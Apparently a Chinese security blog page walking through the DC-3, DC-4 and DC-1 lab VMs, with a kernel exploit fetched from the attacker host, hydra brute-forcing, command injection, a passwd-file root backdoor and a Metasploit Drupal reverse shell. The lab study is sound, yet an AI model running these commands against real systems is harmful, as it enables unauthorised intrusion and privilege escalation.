<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A322.png" class>

<p>可以看到内核版本详细信息为4.4.0</p>
<p>使用kali自带的漏洞库来进行系统漏洞的查找</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A323.png" class>

<p>把内核对应版本的都试一下，可以发现39772.txt能用</p>
<p>查看exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A324.png" class>

<p>下载地址就在下面，把压缩包下载到本地</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A325.png" class>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">开启apache服务</span><br><span class="line">systemctl start apache2.service</span><br><span class="line"></span><br><span class="line">移动39772.zip到指定的apache的目录下，得到访问页面</span><br><span class="line">mv 39772.zip /var/www/html</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A326.png" class>

<p>既然已经移到了web服务下面，那么我们访问虚拟机地址，如果是第一次使用记得删除&#x2F;var&#x2F;www&#x2F;html下的index.html文件</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A327.png" class>

<p>既然已经出现在web目录下，那我们就在目标靶机的shell里下载攻击机上的exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.10.129/39772.zip</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A328.png" class>

<p>解压exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unzip 39772.zip         #解压39772.zip</span><br><span class="line">cd 39772                #进入39772</span><br><span class="line">tar -xvf exploit.tar    #解压缩exploit.tar</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A329.png" class>

<p>进入 ebpf_mapfd_doubleput_exploit 运行exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A330.png" class>

<p>至于运行方法之前那个cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;39772.txt写了的</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A324.png" class>

<p>运行compile.sh ， doubleput即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A331.png" class>

<p>可以看到提权成功，下一步就是进入root，直接得到flag就行</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A332.png" class>

<h2 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h2><h2 id="基础信息搜集-1"><a href="#基础信息搜集-1" class="headerlink" title="基础信息搜集"></a>基础信息搜集</h2><p>老规矩，第一步：确定靶机IP和判断端口所开放的服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.10.0/24</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A3.png" class>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A- -p 192.168.10.137</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A32.png" class>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">22		开放ssh服务</span><br><span class="line">80		开放http服务/面板服务为nginx</span><br></pre></td></tr></table></figure>

<p>使用dirb进行目录爆破：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.10.137/</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A34.png" class>

<p>发现只有文件都被重定向到index.php，看样子不得不登陆了。</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A33.png" class>

<h2 id="hydra爆破登录"><a href="#hydra爆破登录" class="headerlink" title="hydra爆破登录"></a>hydra爆破登录</h2><p>这里直接访问：192.168.10.137:80，看到上述界面，还是使用插件看看框架，发现只有nginx，我们试着搜一搜nginx1.15.10是否存在什么漏洞</p>
<p>使用Metasploit进行探测和访问发现对于这个框架来讲并没有什么可以利用的，所有的对于这个框架的漏洞都不适用于这个nginx的版本，那么就尝试进行暴力破解</p>
<p>我们使用hydra配合kali自带的字典进行破解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/metasploit/password.lst -t 8 192.168.10.137 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot; -F</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A35.png" class>

<p>可以看到爆破成功，密码为happy</p>
<h2 id="命令查询"><a href="#命令查询" class="headerlink" title="命令查询"></a>命令查询</h2><img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A36.png" class>

<p>我们点击Command，跳转到下一个页面</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A37.png" class>

<p>随便选一个，我们点击run进行抓包</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A38.png" class>

<p>很明显，我们可以知道radio参数就是执行命令的所传参数，那我们利用这个来执行命令</p>
<p>既然有ssh服务，那我们就尝试看看能不能找到ssh登录的用户和密码，我们知道在kali下，用户目录一般在&#x2F;home下，所以我们进行查询</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A39.png" class>

<p>发现了三个用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">charles</span><br><span class="line">jim</span><br><span class="line">sam</span><br></pre></td></tr></table></figure>

<p>一一访问一下，charles和sam用户下面只有return to menu，但是在jim目录下发现了一些东西</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A310.png" class>

<p>还是挨着访问一下</p>
<p>还是只有backups下面有内容，cat看一下，发现是存储旧密码的一个文件</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A311.png" class>

<h2 id="hydra爆破ssh密码"><a href="#hydra爆破ssh密码" class="headerlink" title="hydra爆破ssh密码"></a>hydra爆破ssh密码</h2><p>这下好了那我们就生成字典进行爆破登录ssh服务，因为这个是jim用户下的，所以我们用户名直接指定为jim就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P passwd.txt  192.168.10.137 ssh -v</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A312.png" class>

<p>爆破成功我们进行连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@192.168.10.137 -p 22</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A313.png" class>

<p>到这里简单的进一些重要文件看了看不知道该怎么办了，只有去看看wp，发现重点在&#x2F;var&#x2F;mail这个邮件目录下</p>
<p>我们进行查看</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A314.png" class>

<p>我们可以看到邮件里又给出了一个针对于charles的密码，而我们之前使用burpsuite来找ssh服务用户时发现了三个用户，其中就有charles，我们来进行连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh charles@192.168.10.137 -p 22</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A315.png" class>

<p>成功连接</p>
<h2 id="teethe提权"><a href="#teethe提权" class="headerlink" title="teethe提权"></a>teethe提权</h2><p>登录进来之后首先想到的是进行查看suid提权的情况：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A316.png" class>

<p>发现sudo是具有suid权限的，那我们使用sudo -l来看看哪些是具有sudo权限的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A317.png" class>

<p>可以看到teehee是不需要密码就可以使用的，那我们就去网上搜搜teehee命令是否存在提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权</span><br><span class="line"></span><br><span class="line">核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A318.png" class>

<p>可以看到成功以root身份进入shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">ls</span><br><span class="line">ls root</span><br><span class="line">cat root/flag.txt</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A319.png" class>

<p>成功拿到了flag。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/24/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="liberator">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="liberator">
      <meta itemprop="description" content="君子坐而论道，少年起而行之">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | liberator">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/07/24/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">DC1-2靶机复现</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-07-24 16:36:13 / 修改时间：21:24:18" itemprop="dateCreated datePublished" datetime="2023-07-24T16:36:13+08:00">2023-07-24</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>5.9k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>11 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="DC1-2靶机复现"><a href="#DC1-2靶机复现" class="headerlink" title="DC1-2靶机复现"></a>DC1-2靶机复现</h1><h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><h3 id="flag1——msfconsole使用"><a href="#flag1——msfconsole使用" class="headerlink" title="flag1——msfconsole使用"></a>flag1——msfconsole使用</h3><p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A3.png"></p>
<p>先用nmap扫描以下（这里是将DC-1靶机和kali都开启并使用NAT连接的情况下并且知道了DC-1靶机的ip域名），同时我们也知道了靶机所开放的端口</p>
<p>尝试访问</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A32.png"></p>
<p>看起来很像一个管理系统的登录面板啊，用火狐插件搜罗一下页面信息</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A33.png"></p>
<p>搜集到如下信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Drupal  7  一种cms</span><br><span class="line">php     5.4.45</span><br><span class="line">apache  2.2.22</span><br><span class="line">jQusery 1.4.4</span><br></pre></td></tr></table></figure>

<p>接下来使用Metasploit找一下是否有漏洞，首先打开工具：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A34.png"></p>
<p>我们使用命令查找以下是否有Drupal这种cms的漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A35.png"></p>
<p>发现了好几个CVE漏洞</p>
<p>以18年的漏洞为例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp    弹出来一个没有有效载荷</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options   查看以下漏洞产生所需参数配置</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A36.png"></p>
<p>可以发现在必需要求设置为yes的参数里，只有RHOSTS没有值，所以我们将其设置为靶机IP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 192.168.10.135</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A37.png"></p>
<p>可以看到参数已经设置成功</p>
<p>接下来使用run开始攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A38.png"></p>
<p>出现这样就表示已经连接成功，可以直接上shell了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>

<p>输入之后尝试执行命令</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A39.png"></p>
<p>哎？发现了一个可疑文件：flag1.txt ，使用cat查询flag1.txt</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A310.png"></p>
<p>flag1.txt告诉我们每一个好的cms都需要一个好的配置文件——你也一样，那我们来康康配置文件</p>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查查Drupal的配置文件名叫做settings.php，查询看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find -name settings.php</span><br><span class="line">cat ./sites/default/settings.php</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A311.png"></p>
<p>可见，我们查到了flag2的内容，同时出来的还有一个数据库的用户名和密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure>

<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>这里出现了登陆失败，所以我们先试试将普通shell改为交互式shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A312.png"></p>
<p>再次执行数据库命令</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A313.png"></p>
<p>可以看到我们成功登陆进了数据库，先看看有啥表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show datebases;</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A314.png"></p>
<p>可以看到一个是系统库，还有一个是自己的，进去查看一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;      show tables;</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A315.png"></p>
<p>可以看见是有很多表的，我们浏览并发现了一个可能藏有有用信息的表</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A316.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>

<p>发现了两个用户：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</span><br><span class="line">Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</span><br></pre></td></tr></table></figure>

<p>看到这个admin还是很兴奋的，因为他应该是管理员账号，但是这个密码应该是加密过的</p>
<p><strong>法1 修改密码</strong></p>
<p>既然要修改密码，我们查到Drupal的加密脚本是在&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh目录下，先退出数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/scripts/password-hash.sh</span><br></pre></td></tr></table></figure>

<p>在加密脚本里面我们可以看到能用php加参数运行</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A317-16893857433575.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php /var/www/scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A318.png"></p>
<p>可以看到脚本给我们显示出了加密之后的密码，现在我们来修改管理员的密码，首先还是进入到数据库和Drupal的表，再修改密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;    update users set pass = &quot;$S$D1UQvb3x7lKoCSX6S9K.r.wB202Lsa/r7fkOj7CelJsSEMFDJjGv&quot; where name = &#x27;admin&#x27; or name = &#x27;Fred&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A319.png"></p>
<p><strong>法2 添加admin用户</strong></p>
<p>drupal7版本有个SQL注入的漏洞，可以添加一个admin权限的用户，适用版本7.31以下，我们可以在msf找一下这个工具</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A326.png"></p>
<p>发现果然是有的：</p>
<p>然后看一下脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 34992.py -p</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A327.png"></p>
<p>可以通过url下载脚本，这里就不再多说</p>
<p>尝试登录，在content里面发现了flag3</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A320.png"></p>
<p>同时flag3告诉了我们一些信息passwd和shadow，明显就是linux的文件</p>
<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>下面有对于etc&#x2F;passwd和etc&#x2F;shadow，讲的非常详细的两篇文章：</p>
<p><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/839.html">Linux &#x2F;etc&#x2F;passwd内容解释（超详细） (biancheng.net)</a></p>
<p><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/840.html">Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细） (biancheng.net)</a></p>
<p>从两篇文章中我们得知，现在用户的密码存放在&#x2F;etc&#x2F;shadow中，但是这个文件只能用root身份登录，但我们的交互式shell显示出来的只是普通用户，所以这里应该就涉及到了提权</p>
<p>我们先看看用户：</p>
